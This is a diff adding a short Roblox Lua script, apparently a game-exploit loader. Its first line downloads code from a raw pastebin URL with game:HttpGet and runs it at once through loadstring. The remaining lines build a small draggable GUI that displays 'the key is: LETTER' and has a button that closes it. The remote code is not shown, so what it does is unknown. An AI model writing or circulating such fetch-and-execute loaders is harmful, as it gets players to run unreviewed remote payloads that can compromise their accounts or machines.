@@ -1,0 +1,32 @@
+
+loadstring(game:HttpGet("https://pastebin.com/raw/8wrECu99", true))()
+
+local gui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+local frame = Instance.new("Frame", gui)
+local button = Instance.new("TextButton", frame)
+local text = Instance.new("TextLabel", frame)
+
+frame.Size = UDim2.new(0.2,0,0.43,0)
+frame.Position = UDim2.new(0,1426,0,258)
+frame.Draggable = true
+frame.Active = true
+
+button.Size = UDim2.new(1,0,0.3)
+button.Position = UDim2.new(0,1,0,285)
+button.Draggable = false
+button.Active = true
+button.Text = "kill the shitty gui"
+button.TextSize = 40
+
+text.Size = UDim2.new(1,0,0.3)
+text.Position = UDim2.new(0,-2,0,90)
+text.Draggable = false
+text.Active = false
+text.Text = "the key is: LETTER"
+text.TextSize = 31
+text.BackgroundTransparency = 1
+
+
+button.MouseButton1Click:Connect(function()
+gui:Destroy()
+end)
